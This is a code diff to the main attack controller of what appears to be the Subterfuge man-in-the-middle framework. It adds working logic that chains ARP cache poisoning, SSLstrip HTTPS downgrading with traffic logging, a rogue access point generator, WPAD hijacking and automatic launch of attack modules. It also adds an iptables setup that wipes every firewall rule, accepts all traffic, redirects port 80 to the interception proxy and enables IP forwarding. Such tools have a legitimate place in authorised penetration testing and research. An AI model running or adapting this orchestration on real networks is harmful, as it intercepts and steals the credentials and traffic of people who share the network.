@@ -1,6 +1,8 @@
 import os
 import re
 import sys
+sys.path.append('/usr/share/subterfuge')
+import time
   #Ignore Deprication Warnings
 import warnings
 warnings.filterwarnings("ignore", category=DeprecationWarning) 
@@ -14,51 +16,136 @@ settings.configure(DATABASE_ENGINE="sqlite3",
 
 from django.db import models
 from main.models import *
+from modules.models import *
 
 
 def attack(method):
     print "Starting Pwn Ops..."
     
+        #Determine Active Vectors
+    acp, apgenatk, wpad = getvectors()
+    
+        #Launch Attacks
+        #ARP Cache Poison
+    if acp == "yes":
+            #Auto Pwn Method
+        if (method == "auto"):
+            print "Running AutoPwn Method..."
+                #AutoConfig
+            autoconfig()
+            interface, gateway, attackerip, routermac, smartarp = getinfo()
+            
+                #Begin Attack Setup
+            print "Automatically Configuring Subterfuge..."
+            iptablesconfig()
+            print "Initiating ARP Poison With ARPMITM..."
+                #ARP Cache Poison through Subterfuge:
+            command = 'python ' + os.path.dirname(os.path.abspath(__file__)) + '/utilities/arpmitm.py ' + gateway + ' &'
+            os.system(command)
+            print "Starting up SSLstrip..."
+            sslstrip()
+
+
+            #os.system("python " + str(os.path.dirname(__file__)) + "/mitm.py -a &")
+                
+                 #Check for ARPWatch
+            if (smartarp == "yes"):
+                 os.system("python " + str(os.path.dirname(__file__)) + "/utilities/arpwatch.py " + gateway + " " + routermac + " " + attackerip + " &")
+                
+            else:
+                print "Encountered an error configuring arpwatch: Router MAC Address Unknown. Terminating..."
+            
+            #Standard Attack Method
+        else:
+            interface, gateway, attackerip, routermac, smartarp = getinfo()
+            
+                #Begin Attack Setup
+            print "Automatically Configuring Subterfuge..."
+            iptablesconfig()
+            print "Initiating ARP Poison With ARPMITM..."
+                #ARP Cache Poison through Subterfuge:
+            command = 'python ' + os.path.dirname(os.path.abspath(__file__)) + '/utilities/arpmitm.py ' + gateway + ' &'
+            os.system(command)
+            print "Starting up SSLstrip..."
+            sslstrip()
+    
+                #Get & Log Router Mac
+            if (os.path.exists(os.path.dirname(os.path.abspath(__file__)) + "/arpmitm.txt")):
+                f = open(os.path.dirname(os.path.abspath(__file__)) + "/arpmitm.txt", 'r')
+                mac = f.readline()
+                macaddr = mac.rstrip("\n")
+                setup.objects.update(routermac = macaddr)
+                
+                #Check for ARPWatch
+            if (smartarp == "yes"):
+                os.system("python " + str(os.path.dirname(__file__)) + "/utilities/arpwatch.py " + gateway + " " + routermac + " " + attackerip + " &")
+                
+            else:
+                print "Dynamic ARP Retention is disabled."
+                
+        #Wireless AP Generator
+    if apgenatk == "yes":
+            #Get Attack Info
+        for info in apgen.objects.all():
+            essid     = info.essid
+            channel   = info.channel
+            atknic    = info.atknic
+            netnic    = info.netnic
+        
+        print "Launching Access Point Generation Attack..."
+        cmd = "xterm -e sh -c 'python " + str(os.path.dirname(__file__)) + "/utilities/apgen.py " + essid + " " + atknic + " " + netnic + "' &"
+        print cmd
+        os.system(cmd)
+        
+            #Begin MITM Attack Setup
+        print "Automatically Configuring Subterfuge..."
+        iptablesconfig()
+        print "Starting up SSLstrip..."
+        sslstrip()
+        
+        #WPAD Hijacking
+    if wpad == "yes":
         #Auto Pwn Method
-    if (method == "auto"):
         print "Running AutoPwn Method..."
             #AutoConfig
         autoconfig()
         interface, gateway, attackerip, routermac, smartarp = getinfo()
         
+            #Begin MITM Attack Setup
             #Begin Attack Setup
-            #Start Up MITM
-        os.system("python " + str(os.path.dirname(__file__)) + "/mitm.py -a &")
-            
-             #Check for ARPWatch
-        if (smartarp == "yes"):
-             os.system("python " + str(os.path.dirname(__file__)) + "/utilities/arpwatch.py " + gateway + " " + routermac + " " + attackerip + " &")
-            
-        else:
-            print "Encountered an error configuring arpwatch: Router MAC Address Unknown. Terminating..."
+            #No IPTables SSLStrip Configuration necessary for WPAD Hijacking
+        #print "Automatically Configuring Subterfuge..."
+        #iptablesconfig()
+            #Flush IPTables
+        print "Flushing IPTables for WPAD Hijacking"
+        os.system("iptables -t nat -F")
+        print "Starting up SSLstrip..."
+        sslstrip()
+            #Execute WPAD Hijacking
+        os.system("python " + str(os.path.dirname(__file__)) + "/utilities/wpadhijack.py " + gateway + " " + routermac + " " + attackerip + " &")
         
-        #Standard Attack Method
-    else:
-        interface, gateway, attackerip, routermac, smartarp = getinfo()
+        #Start Up Modules
+    modules()
         
-            #Begin Attack Setup
-            #Start Up MITM
-        os.system("python " + str(os.path.dirname(__file__)) + "/mitm.py -a &")
 
-            #Get & Log Router Mac
-        if (os.path.exists(os.path.dirname(os.path.abspath(__file__)) + "/arpmitm.txt")):
-            f = open(os.path.dirname(os.path.abspath(__file__)) + "/arpmitm.txt", 'r')
-            mac = f.readline()
-            macaddr = mac.rstrip("\n")
-            setup.objects.update(routermac = macaddr)
-            
-            #Check for ARPWatch
-        if (smartarp == "yes"):
-            os.system("python " + str(os.path.dirname(__file__)) + "/utilities/arpwatch.py " + gateway + " " + routermac + " " + attackerip + " &")
-            
-        else:
-            print "Encountered an error configuring arpwatch: Router MAC Address Unknown. Terminating..."
+def getvectors():
+        #Get Attack Vectors
+    active = []
+    for vector in vectors.objects.all():
+        active.append(vector.active)
+    
+        #Return Active/Inactive
+    return active[0], active[1], active[2]
 
+def modules():
+        #Check Active
+    active = []
+    for module in installed.objects.all():
+        active.append(module.active)    
+            #Deploy Active Vectors
+        if module.active == "yes":
+            os.system("python " + str(os.path.dirname(__file__)) + "/modules/" + module.name + "/" + module.name + ".py &")
+    
 
 
 def getinfo():
@@ -73,6 +160,32 @@ def getinfo():
     return interface, gateway, attackerip, routermac, smartarp
 
 
+    #SSLStrip tooled through Subterfuge:
+def sslstrip():
+    #run sslstrip
+    os.system('python ' + os.path.dirname(__file__) + '/sslstrip.py -w ' + os.path.dirname(__file__) + '/sslstrip.log -l 10000 -f &')
+    #-a includes all traffic not just https post requests
+    
+
+    #Set system configuration to perform MITM Attacks
+def iptablesconfig():
+    os.system('iptables -F')
+    os.system('iptables -X')
+    os.system('iptables -t nat -F')
+    os.system('iptables -t nat -X')
+    os.system('iptables -t mangle -F')
+    os.system('iptables -t mangle -X')
+    os.system('iptables -P INPUT ACCEPT')
+    os.system('iptables -P FORWARD ACCEPT')
+    os.system('iptables -P OUTPUT ACCEPT')
+    time.sleep(1)
+    os.system('iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 	10000')
+    time.sleep(1)
+    print "Iptables Prerouting Configured\n"
+    
+    print 'Configuring System...'
+    os.system('sysctl -w net.ipv4.ip_forward=1')
+    print "IP Forwarding Enabled."
 
 def autoconfig():
           # Read in subterfuge.conf Deprecate for Version 5.0
